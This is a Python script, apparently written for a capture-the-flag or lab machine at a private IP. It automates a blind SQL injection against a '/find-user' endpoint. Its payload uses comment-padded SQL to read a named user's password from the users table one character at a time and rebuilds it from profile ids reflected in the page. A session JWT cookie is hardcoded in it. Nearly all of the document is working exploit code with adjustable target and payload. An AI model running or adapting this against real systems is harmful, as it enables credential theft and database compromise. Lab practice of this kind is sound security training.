#!/usr/bin/python3
import httplib2, string
import urllib.parse
from bs4 import BeautifulSoup
import re

flag = ""
#Adjust to the victim URL
URL = "http://10.129.114.229:8080/find-user?u="

#Adjust the cookie to target your username
cookie = "auth=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ5b3ZlY2lvIiwiaWF0IjoxNzExNjMzODM5LCJleHAiOjE3MTE2NDI0Nzl9.vDRIRNi8lVh7EVzBBUSO1byZXY_S8Qb0AEaaYBr341X5-EPUZJ673XqVuOagBIZpCuAmg7fVHly7EWRkhrDK8Q"
http = httplib2.Http()

#Extract the profile id
#number_match = re.search(r"/profile/(\d+)", str(response))
#if number_match:
#    extracted_number = int(number_match.group(1))
#    print(f"Extracted number: {extracted_number}")
#else:
#    print("No number found in the code snippet.")


for i in range(100):
    #Adjust the payload
    params = "'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,%i,1))/**/FROM/**/users/**/WHERE/**/username=$$artisticTortoise8$$)--" %(i)
    #URL Encode
    params = urllib.parse.quote(params) 
    send = http.request(str(URL+params), method="GET", headers={'Cookie':cookie})[1]
    #Extract the div containing the response
    soup = BeautifulSoup(send.decode(),"lxml")
    response = soup.find_all("div", {"class": "mt-3 pt-2"})

    #Regex to extract the profile id(int) based on the query, OBS the ID is the int(char)
    number_match = re.search(r"/profile/(\d+)", str(response))
    if number_match:
        extracted_number = int(number_match.group(1))
        flag += chr(extracted_number)
        print(f"Flag is: {flag}" + "\n")
    else:
        print("No number found in the code snippet.")

    